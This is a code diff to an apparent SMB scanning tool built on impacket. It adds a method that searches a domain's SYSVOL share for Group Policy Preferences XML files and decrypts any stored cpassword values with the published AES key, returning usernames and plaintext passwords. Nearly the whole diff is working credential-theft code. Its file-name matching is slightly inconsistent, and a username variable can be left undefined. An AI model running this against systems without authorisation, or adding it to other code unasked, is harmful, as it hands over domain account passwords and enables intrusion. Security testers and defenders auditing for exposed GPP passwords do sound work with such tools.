@@ -4,6 +4,11 @@ import socket
 import traceback
 import struct
 import ntpath
+import xml.etree.ElementTree as ET
+from io import BytesIO
+from Cryptodome.Cipher import AES
+from base64 import b64decode
+from binascii import unhexlify
 
 import impacket
 from impacket.smbconnection import SessionError, SMBConnection
@@ -505,4 +510,74 @@ class SMBScan:
         for spn in get_spns.run():
             yield spn
 
+    def list_gpps(self):
+        sysvol_found = False
+        for share in self.list_shares():
+            if share['name'] == 'SYSVOL' and 'READ' in share['access']:
+                sysvol_found = True
+                break
+
+        if not sysvol_found:
+            print('No access to SYSVOL share')
+            return
+
+        gpp_files = []
+        for path in self.list_content('\\', 'SYSVOL', recurse=10):
+            filename = path['name'].split('\\')[-1]
+            if filename in ['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml']:
+                gpp_files.append(path['name'])
+
+        for path in gpp_files:
+            buf = BytesIO()
+            self.conn.getFile('SYSVOL', path, buf.write)
+            xml = ET.fromstring(buf.getvalue())
+
+            if 'Groups.xml' in path:
+                xml_section = xml.findall("./User/Properties")
+
+            elif 'Services.xml' in path:
+                xml_section = xml.findall('./NTService/Properties')
+
+            elif 'ScheduledTasks.xml' in path:
+                xml_section = xml.findall('./Task/Properties')
+
+            elif 'DataSources.xml' in path:
+                xml_section = xml.findall('./DataSource/Properties')
+
+            elif 'Printers.xml' in path:
+                xml_section = xml.findall('./SharedPrinter/Properties')
+
+            elif 'Drives.xml' in path:
+                xml_section = xml.findall('./Drive/Properties')
+
+            for attr in xml_section:
+                props = attr.attrib
+
+                if 'cpassword' in props:
+
+                    for user_tag in ['userName', 'accountName', 'runAs', 'username']:
+                        if user_tag in props:
+                            username = props[user_tag]
+
+                    password = self.__decrypt_cpassword(props['cpassword'])
+
+                    yield {
+                        'username': username,
+                        'password': password,
+                        'path': path,
+                    }
+
+    def __decrypt_cpassword(self, cpassword):
+
+        #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
+
+        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
+        key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
+        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
+        password = b64decode(cpassword)
+        IV = "\x00" * 16
+        decrypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
+        padding_bytes = decrypted[-1]
+        decrypted = decrypted[:-padding_bytes]
+        return decrypted.decode('utf16')
 
